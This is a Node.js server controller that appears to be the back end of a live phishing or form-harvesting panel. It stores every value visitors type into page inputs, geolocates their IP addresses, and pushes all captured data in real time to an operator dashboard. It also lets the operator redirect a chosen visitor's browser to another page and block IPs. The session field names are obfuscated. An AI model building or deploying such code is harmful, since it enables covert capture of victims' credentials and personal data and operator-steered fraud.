const axios = require("axios");
const fs = require("fs");
const path = require("path");

// Temporary in-memory storage (Consider using a database)
let activeUsers = [];
let previousUsers = [];
let userInputs = {};
const ipCache = {};
const sessionMessages = {};
const BLOCKED_IPS_PATH = path.join(__dirname, "../blockedIPs.json");

// Load existing data from file (if available)
const dataFilePath = path.join(__dirname, "../userSessions.txt");
try {
    if (fs.existsSync(dataFilePath)) {
        const data = JSON.parse(fs.readFileSync(dataFilePath, "utf8"));
        activeUsers = data.activeUsers || [];
        previousUsers = data.previousUsers || [];
        userInputs = data.userInputs || {};
    }
} catch (error) {
    console.error("Error loading saved data:", error);
}

// ✅ Save function (writes active users, previous users, and user inputs to file)
const saveDataToFile = () => {
    const data = { activeUsers, previousUsers, userInputs };
    fs.writeFileSync(dataFilePath, JSON.stringify(data, null, 2));
};

// ✅ Track user activity
const trackUserActivity = async (req, res) => {
    const { uCukkzD, pageUrl, mtaP, eventType, inputName, inputValue, componentName, browserInfo } = req.body;
    let ip = mtaP ||
        (req.headers["x-forwarded-for"]?.split(",")[0] || req.connection?.remoteAddress || req.ip)
        .replace(/^::ffff:/, "");

    if (!ip || ip === "Unknown IP") {
        console.error("❌ IP undefined in request.");
        return res.status(400).json({ error: "IP undefined" });
    }

    try {
        // Fetch country from IP info API (if not cached)
        let country = ipCache[ip] || "Unknown";
        if (!ipCache[ip]) {
            try {
                const geoResponse = await axios.get(`https://ipinfo.io/${ip}/json?token=${process.env.IPINFO_TOKEN}`);
                country = geoResponse.data.country;
                ipCache[ip] = country;
            } catch (error) {
                console.error("IP tracking error:", error);
            }
        }

        // Handle user inputs
        if (eventType === "input") {
            if (!userInputs[uCukkzD]) {
                userInputs[uCukkzD] = {};
            }
            userInputs[uCukkzD][inputName] = { value: inputValue, timestamp: new Date() };
        }

        // Construct user object
        const user = {
            uCukkzD,
            ip,
            country,
            pageUrl,
            eventType,
            componentName,
            browserInfo,
            inputs: userInputs[uCukkzD] || {},
            lastActive: new Date(),
            timestamp: new Date()
        };

        // Update existing user or add a new one
        const existingUserIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
        if (existingUserIndex !== -1) {
            activeUsers[existingUserIndex] = { ...activeUsers[existingUserIndex], ...user };
        } else {
            activeUsers.push(user);
        }

        // Handle user disconnection
        if (eventType === "page_unload") {
            const userIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
            if (userIndex !== -1) {
                const disconnectedUser = { ...activeUsers[userIndex], disconnectedAt: new Date() };
                previousUsers.push(disconnectedUser);
                activeUsers.splice(userIndex, 1);
            }
        }

        saveDataToFile();
        global.io.emit("update", { activeUsers, previousUsers });

        res.status(200).json({ status: "OK" });
    } catch (error) {
        console.error("Tracking error:", error);
        res.status(500).json({ error: "Internal Server Error" });
    }
};

// ✅ Session Update API
const updateSessionRoute = (req, res) => {
    const { uCukkzD, newRoute } = req.body;
    console.log(`Changing route for session ${uCukkzD} to ${newRoute}`);

    try {
        const sockets = Array.from(global.io.sockets.sockets.values());
        const targetSocket = sockets.find(socket => socket.handshake.auth.uCukkzD === uCukkzD);

        if (targetSocket) {
            targetSocket.emit("changeRoute", newRoute);
            console.log(`Route change emitted to socket ${targetSocket.id}`);

            const userIndex = activeUsers.findIndex(u => u.uCukkzD === uCukkzD);
            if (userIndex !== -1) {
                activeUsers[userIndex] = {
                    ...activeUsers[userIndex],
                    pageUrl: newRoute,
                    lastRouteChange: new Date()
                };
                saveDataToFile();
                global.io.emit("update", { activeUsers, previousUsers });
            }
            res.sendStatus(200);
        } else {
            console.log(`No socket found for session ${uCukkzD}`);
            res.status(404).json({ error: "User not found" });
        }
    } catch (error) {
        console.error("Error changing route:", error);
        res.status(500).json({ error: "Internal server error" });
    }
};

// ✅ Blocked IP Check
const checkBlockedIP = (req, res) => {
    const { ip } = req.query;
    if (!ip) return res.status(400).json({ error: "IP is required" });

    const blockedIPs = fs.existsSync(BLOCKED_IPS_PATH)
        ? JSON.parse(fs.readFileSync(BLOCKED_IPS_PATH, "utf8"))
        : [];

    res.json({ blocked: blockedIPs.includes(ip) });
};

// ✅ Audit & Block User
const blockUser = (req, res) => {
    const { ip } = req.body;
    if (!ip) return res.status(400).json({ error: "IP is required" });

    let blockedIPs = fs.existsSync(BLOCKED_IPS_PATH)
        ? JSON.parse(fs.readFileSync(BLOCKED_IPS_PATH, "utf8"))
        : [];

    if (!blockedIPs.includes(ip)) {
        blockedIPs.push(ip);
        fs.writeFileSync(BLOCKED_IPS_PATH, JSON.stringify(blockedIPs, null, 2));
        console.log(`🚨 User Blocked: ${ip}`);
        return res.status(200).json({ message: `User with IP ${ip} blocked.` });
    }

    res.status(200).json({ message: "User was already blocked." });
};

module.exports = {
    trackUserActivity,
    updateSessionRoute,
    checkBlockedIP,
    blockUser
};
